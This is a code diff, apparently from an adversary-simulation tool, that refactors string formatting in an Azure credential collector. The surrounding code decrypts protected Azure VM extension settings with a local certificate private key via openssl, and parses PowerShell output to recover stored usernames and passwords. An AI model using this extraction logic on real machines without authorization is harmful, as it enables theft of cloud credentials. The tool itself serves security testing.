@@ -53,18 +53,18 @@ class AzureCollector(object):
                 "protectedSettingsCertThumbprint"
             ]
             base64_command = """openssl base64 -d -a"""
-            priv_path = os.path.join(linux_cert_store, "%s.prv" % cert_thumbprint)
+            priv_path = os.path.join(linux_cert_store, f"{cert_thumbprint}.prv")
             b64_proc = subprocess.Popen(
                 base64_command.split(), stdin=subprocess.PIPE, stdout=subprocess.PIPE
             )
             b64_result = b64_proc.communicate(input=protected_data + "\n")[0]
-            decrypt_command = "openssl smime -inform DER -decrypt -inkey %s" % priv_path
+            decrypt_command = f"openssl smime -inform DER -decrypt -inkey {priv_path}"
             decrypt_proc = subprocess.Popen(
                 decrypt_command.split(), stdout=subprocess.PIPE, stdin=subprocess.PIPE
             )
             decrypt_raw = decrypt_proc.communicate(input=b64_result)[0]
             decrypt_data = json.loads(decrypt_raw)
-            T1005Telem(ScanStatus.USED, "Azure credentials", "Path: %s" % filepath).send()
+            T1005Telem(ScanStatus.USED, "Azure credentials", f"Path: {filepath}").send()
             T1064Telem(ScanStatus.USED, "Bash scripts used to extract azure credentials.").send()
             return decrypt_data["username"], decrypt_data["password"]
         except IOError:
@@ -113,7 +113,7 @@ class AzureCollector(object):
             # this is disgusting but the alternative is writing the file to disk...
             password_raw = ps_out.split("\n")[-2].split(">")[1].split("$utf8content")[1]
             password = json.loads(password_raw)["Password"]
-            T1005Telem(ScanStatus.USED, "Azure credentials", "Path: %s" % filepath).send()
+            T1005Telem(ScanStatus.USED, "Azure credentials", f"Path: {filepath}").send()
             T1064Telem(
                 ScanStatus.USED, "Powershell scripts used to extract azure credentials."
             ).send()
